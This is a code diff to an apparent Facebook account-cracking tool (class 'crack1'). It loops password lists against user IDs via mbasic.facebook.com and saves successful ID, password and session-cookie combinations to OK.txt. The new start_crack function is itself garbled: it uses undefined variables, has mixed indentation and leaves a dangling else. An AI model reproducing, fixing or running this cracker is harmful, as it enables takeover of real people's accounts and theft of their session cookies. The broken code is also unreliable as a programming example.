@@ -1554,16 +1554,20 @@ class crack1:
 				os.remove(self.apk)
 				print("   [•] Finished")
 				break
-def main(self,fl):
-		try:
-			for i in fl.get("pw"):
-				log=mbasic(fl.get("id"),
-					i,"https://mbasic.facebook.com")
-				if log.get("status")=="success":
-					print("\r   [OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
-					self.ada.append("%s|%s"%(fl.get("id"),i))
-					if fl.get("id") in open("OK.txt").read():
-						break
+def start_crack(self,id,list_pw):
+        try:
+            for pw in list_pw:
+              if sistem_login   == 'satu' : log = logger1(id,pw)
+              elif sistem_login == 'dua'  : log = logger2(id,pw)
+              elif sistem_login == 'tiga' : log = logger3(id,pw)
+              else:log = logger1(id,pw)
+              for i in fl.get("pw"):
+                log=mbasic(fl.get("id"),
+                i,"https://mbasic.facebook.com")
+                if log.get("status")=="success":
+                  print("\r   [OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
+                  self.ada.append("%s|%s"%(fl.get("id"),i))
+                  if fl.get("id") in open("OK.txt").read():break
 					else:
 						open("OK.txt","a+").write(
 						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
